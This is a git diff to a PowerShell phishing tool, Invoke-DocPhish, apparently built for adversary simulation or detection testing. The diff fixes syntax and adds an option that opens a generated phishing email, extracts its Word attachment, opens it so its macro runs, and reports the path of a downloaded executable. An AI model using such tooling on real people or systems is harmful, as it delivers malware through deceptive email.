@@ -69,8 +69,9 @@ function Invoke-DocPhish {
 	.EXAMPLE
 
 	    Create Default Email
-		PS> Invoke-DocPhish -Generate Msg
-		PS> Invoke-DocPhish -Generate Msg -MsgTo "dschrute@dundermifflin.com" -MsgSubject "Secret Mission" -MsgBody "Kurt,`r`n`r`nMeet me on the roof!" -DocName "Secret" -MsgName "Secret"
+		PS> Invoke-DocPhish -Generate "Msg"
+		PS> Invoke-DocPhish -Generate "Msg" -Execute "True"
+		PS> Invoke-DocPhish -Generate "Msg" -MsgTo "dschrute@dundermifflin.com" -MsgSubject "Secret Mission" -MsgBody "Kurt,`r`n`r`nMeet me on the roof!" -DocName "Secret" -MsgName "Secret"
 
 	.NOTES
 
@@ -221,37 +222,37 @@ $Command")
 				$Message.SaveAs("$MsgFullPath")
 				$Message.Close(1)
 				$Outlook.Quit()
+
+				if ($Execute -eq "True") {
+					Write-Host -ForegroundColor Green "  [+] Opening Email and Document"
+					$NewOutlookCheck = Get-Process -Name "OUTLOOK" -ErrorAction SilentlyContinue
+					if ($NewOutlookCheck) {
+						Write-Host -ForegroundColor Yellow "    [-] Outlook is already open, closing to continue"
+						Stop-Process -Name "OUTLOOK" -ErrorAction Ignore
+						}
+					Write-Host -ForegroundColor Yellow "  [+] Sleeping for 30 seconds to provide separation in logging"
+					Start-Sleep -s 30
+					$NewOutlook = New-Object -ComObject Outlook.Application
+					$NewMessage = $NewOutlook.Session.OpenSharedItem("$MsgFullPath")
+					$AttachmentName = $NewMessage.Attachments.Item(1).FileName
+					$TempDocLocation = Join-Path -Path $env:USERPROFILE\AppData\Local\Microsoft\Windows\INetCache -ChildPath $AttachmentName
+					$NewMessage.Attachments(1).saveasfile("$TempDocLocation")
+					Write-Host -ForegroundColor Yellow "  [+] Showing Completed Email Message"
+					$NewMessage.Display()
+					$NewWord = New-Object -ComObject Word.Application
+					Write-Host -ForegroundColor Yellow "  [+] Opening Word Doc and Executing Macro"
+					$NewWord.Documents.Open("$TempDocLocation") | Out-Null
+					#$NewWord.Run("AutoOpen")
+					Write-Host -ForegroundColor Yellow "  [+] Cleaning Up Email and Document Files"
+					Start-Sleep -s 10
+					$NewWord.Quit()
+					$NewOutlook.Quit()
+					Stop-Process -Name "OUTLOOK" -ErrorAction Ignore
+					Write-Host -ForegroundColor Green "  [+] Downloaded Executable Located: $ExecutableFullPath"
+				}
 			}
-
-			if ($Execute -eq "True")
-				Write-Host -ForegroundColor Green "  [+] Opening Email and Document"
-		        $NewOutlookCheck = Get-Process -Name "OUTLOOK" -ErrorAction SilentlyContinue
-			    if ($NewOutlookCheck) {
-			        Write-Host -ForegroundColor Yellow "    [-] Outlook is already open, closing to continue"
-			        Stop-Process -Name "OUTLOOK" -ErrorAction Ignore
-			        }
-			    Write-Host -ForegroundColor Yellow "  [+] Sleeping for 30 seconds to provide separation in logging"
-			    Start-Sleep -s 30
-			    $NewOutlook = New-Object -ComObject Outlook.Application
-			    $NewMessage = $NewOutlook.Session.OpenSharedItem("$MsgFullPath")
-			    $AttachmentName = $NewMessage.Attachments.Item(1).FileName
-			    $TempDocLocation = Join-Path -Path $env:USERPROFILE\AppData\Local\Microsoft\Windows\INetCache -ChildPath $AttachmentName
-			    $NewMessage.Attachments(1).saveasfile("$TempDocLocation")
-			    Write-Host -ForegroundColor Yellow "  [+] Showing Completed Email Message"
-			    $NewMessage.Display()
-			    $NewWord = New-Object -ComObject Word.Application
-			    Write-Host -ForegroundColor Yellow "  [+] Opening Word Doc and Executing Macro"
-			    $NewWord.Documents.Open("$TempDocLocation") | Out-Null
-			    #$NewWord.Run("AutoOpen")
-			    Write-Host -ForegroundColor Yellow "  [+] Cleaning Up Email and Document Files"
-			    Start-Sleep -s 10
-			    $NewWord.Quit()
-			    $NewOutlook.Quit()
-			    Stop-Process -Name "OUTLOOK" -ErrorAction Ignore
 			Catch {
-
-			Write-Host -ForegroundColor Red "  [-] Failed to Create Email Message with Outlook"
-
+			    Write-Host -ForegroundColor Red "  [-] Failed to Create Email Message with Outlook"
 			}
 
 		        # Cleanup
@@ -266,7 +267,7 @@ $Command")
 		else {
 		    # Output finished information
 		    Write-Host -ForegroundColor Green "  [+] Document Located: $DocFullPath"
-		    if ($Execute -eq "True")
+		    if ($Execute -eq "True") {
 			    $NewWord = New-Object -ComObject Word.Application
 			    Write-Host -ForegroundColor Green "  [+] Opening Word Doc and Executing Macro"
 			    $NewWord.Documents.Open("$DocFullPath") | Out-Null
@@ -274,7 +275,10 @@ $Command")
 			    Write-Host -ForegroundColor Yellow "  [+] Cleaning Up Document Files"
 			    Start-Sleep -s 10
 			    $NewWord.Quit()
-			    Stop-Process -Name "WINWORD" -ErrorAction Ignore		}
+			    Stop-Process -Name "WINWORD" -ErrorAction Ignore
+				Write-Host -ForegroundColor Green "  [+] Downloaded Executable Located: $ExecutableFullPath"
+				}
+		}
     }
 
     Catch {
